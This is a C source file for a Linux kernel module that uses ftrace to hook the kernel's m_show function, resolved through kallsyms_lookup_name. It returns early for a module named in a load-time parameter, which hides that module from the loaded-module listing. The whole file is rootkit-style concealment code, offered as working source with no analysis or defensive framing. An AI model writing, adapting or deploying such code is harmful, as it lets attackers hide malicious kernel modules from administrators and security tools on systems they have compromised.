#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/ftrace.h>
#include <net/inet_sock.h>

// Function prototype
void callback_func(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct pt_regs *regs);

// Types & other consts.
static char *module_to_hide;
module_param(module_to_hide, charp, 0);

typedef int (*original_m_show_t)(struct seq_file *seq, void *v);
static unsigned long m_show_address; 
static original_m_show_t original_m_show_ptr;
static struct ftrace_ops ops = { .func = callback_func, .flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY};

int new_m_show(struct seq_file *m, void *p) {
    struct module *mod = p;
    char *mod_name = mod->name;
    char *corrected_mod_name = mod_name - (sizeof(char) * 8);

    if (!strcmp(corrected_mod_name, module_to_hide)) {
        printk(KERN_ALERT "Hiding %s", corrected_mod_name);
        return 0;
    }

    return original_m_show_ptr(m, p);
}

void notrace callback_func(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct pt_regs *regs) {
    // To prevent an infinite loop.
    if (!within_module(parent_ip, THIS_MODULE)) {
        regs->ip = (long unsigned int)new_m_show;
    }
}
 
int load(void) {
    printk(KERN_ALERT "Initializing...");
    m_show_address = kallsyms_lookup_name("m_show");
    if (!m_show_address) {
        printk(KERN_ALERT "Failed to find m_show!");            
        return 0;
    }

    printk(KERN_ALERT "m_show found %lu", m_show_address);
    original_m_show_ptr = (original_m_show_t)m_show_address;
    ftrace_set_filter_ip(&ops, (unsigned long)original_m_show_ptr, 0, 0);
    register_ftrace_function(&ops);
    printk(KERN_ALERT "Initialized successfuly!");

    return 0;
}
 
void unload(void) {
    printk(KERN_ALERT "Shutting down.");
    unregister_ftrace_function(&ops);
    printk(KERN_ALERT "Goodbye world...");
}

module_init(load);
module_exit(unload);

MODULE_LICENSE("GPL");